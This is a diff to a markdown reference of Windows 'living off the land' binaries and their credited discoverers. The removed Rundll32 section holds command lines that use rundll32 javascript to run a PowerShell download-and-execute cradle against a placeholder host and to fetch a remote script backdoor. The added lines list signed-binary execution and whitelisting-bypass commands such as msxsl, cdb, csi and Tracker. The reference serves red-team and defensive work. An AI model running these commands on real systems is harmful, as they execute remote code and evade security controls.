@@ -5,45 +5,9 @@ If you are missing from the acknowledgement, please let me know (I did not forge
    
 # OS BINARIES
    
-## Rundll32.exe
+#include "OSBinaries/Rundll32.md"
 
-* Functions: Execute
-
-```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
-
-rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
-
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
-
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
-
-rundll32 shell32.dll,Control_RunDLL payload.dll
-
-rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
-
-rundll32.exe advpack.dll,RegisterOCX calc.exe
-
-rundll32.exe zipfldr.dll,RouteTheCall calc.exe
-
-rundll32.exe url.dll,OpenURL "C:\test\calc.hta"
-
-rundll32.exe url.dll,OpenURL "C:\test\calc.url"
-
-rundll32.exe url.dll, FileProtocolHandler calc.exe
-
-rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"
-
-rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"
-
-rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,
-```
-  
-Acknowledgements:
-* Casey Smith - @subtee
-* Jimmy - @bohops
-* Moriarty - @Moriarty_Meng
-* Adam - @hexacorn
+[this subtext](OSBinaries/Rundll32.md)
    
    
 ## Regsvr32.exe
@@ -290,7 +254,7 @@ MavInject32.exe 3110 /INJECTRUNNING c:\folder\evil.dll>
 ```
 
 Acknowledgements:
-* Giuseppe `N3mes1s` - @gN3mes1s
+* Giuseppe N3mes1s - @gN3mes1s
 * Adam - @hexacorn
    
    
@@ -335,7 +299,126 @@ ie4unit.exe -BaseSettings
 
 Acknowledgements:
 * Jimmy - @bohops
+   
+   
+   
+# OTHER MICROSOFT SIGNED BINARIES
+   
+## Bginfo.exe
 
+* Functions: Execute
 
+```
+bginfo.exe bginfo.bgi /popup /nolicprompt
+(Add vbs code inside .bgi file)
+```
 
+Acknowledgements:
+* Oddvar Moe - @oddvarmoe
+   
+   
+   
+## msxsl.exe
 
+* Functions: Execute
+
+```
+msxsl.exe customers.xml script.xsl
+```
+
+Acknowledgements:
+* Casey Smith - @subtee
+   
+   
+   
+## winword.exe
+
+* Functions: Execute
+
+```
+winword.exe /l dllfile.dll
+```
+
+Acknowledgements:
+* Casey Smith - @subtee
+   
+   
+   
+## dnx.exe
+
+* Functions: Execute
+
+```
+dnx.exe consoleapp
+```
+
+Acknowledgements:
+* Matt Nelson - @enigma0x3
+   
+   
+   
+## cdb.exe
+
+* Functions: Execute
+
+```
+cdb.exe -cf x64_calc.wds -o notepad.exe
+```
+
+Acknowledgements:
+* Matt Graber - @mattifestation
+   
+   
+   
+## rcsi.exe
+
+* Functions: Execute
+
+```
+rcsi.exe bypass.csx
+```
+
+Acknowledgements:
+* Matt Nelson - @enigma0x3
+   
+   
+   
+## csi.exe
+
+* Functions: Execute
+
+```
+csi.exe file
+```
+
+Acknowledgements:
+* Casey Smith - @subtee
+   
+   
+   
+## te.exe
+
+* Functions: Execute
+
+```
+te.exe bypass.wsc
+```
+
+Acknowledgements:
+* * Giuseppe N3mes1s - @gN3mes1s
+   
+   
+   
+## Tracker.exe
+
+* Functions: Execute
+
+```
+Tracker.exe /d .\calc.dll /c C:\Windows\write.exe
+```
+
+Acknowledgements:
+* * Giuseppe N3mes1s - @gN3mes1s   
+   
+   
+   
